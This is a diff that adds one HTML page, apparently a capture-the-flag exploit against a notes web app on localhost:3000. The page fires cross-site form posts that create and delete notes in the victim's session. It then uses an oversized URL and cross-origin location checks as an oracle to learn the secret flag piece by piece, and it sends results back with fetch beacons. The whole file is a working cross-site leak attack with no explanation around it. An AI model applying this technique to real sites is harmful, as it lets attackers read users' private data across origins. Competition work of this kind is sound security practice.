@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form id=f  method="POST" target="winForm">
+    <input id=inp name="text" value="">
+  </form>
+
+  <form id=f_delete action="http://localhost:3000/remove" method="POST" target="_blank">
+    <input name="index" value="0">
+  </form>
+
+  <form id=f_create action="http://localhost:3000/create" method="POST" target="_blank">
+    <input id=inp2 name="text" value="">
+  </form>
+
+  <script>
+    const sleep = ms => new Promise(r => setTimeout(r, ms))
+    fetch('/hang')
+    win = window.open('about:blank', 'winForm')
+
+    f.action = 'http://'+ 'a'.repeat(2097050)  + ':def@localhost:3000' + '/create'
+
+    let count = 0
+    setInterval(() => {
+      fetch('/ping_' + count)
+      count++
+    }, 100)
+
+    // abcdefghijklmnopqrstuvwxyz
+    async function main() {
+      // step1. create note
+      let testPayload = 'dice{xs'
+      fetch('/step_1_start')
+      inp2.value = testPayload + 'z'.repeat(10000)
+      f_create.submit()
+      await sleep(500)
+      fetch('/step_1_end')
+
+      // step2. delete first note
+      fetch('/step_2_start')
+      f_delete.submit()
+      await sleep(500)
+      fetch('/step_2_end')
+
+      // step3. leak
+      fetch('/step_3_start')
+      inp.value = 'a'.repeat(10000)
+      f.submit()
+      fetch('/step_3_end')
+
+      let count = 0
+      setInterval(() => {
+        fetch('/timeout'+count)
+        count++
+        try {
+          let r = win.location.href
+          fetch('/?r=' + r)
+        } catch(err) {
+          fetch('/err')
+        }
+
+        // err: payload is before flag
+        // dice{azzz
+        // dice{flag}
+
+        // about:blank, payload is after flag
+        // dice{flag}
+        // dice{fzzzz}
+      }, 200)
+    }
+
+    main()
+      
+  </script>
+
+</body>
+
+</html>
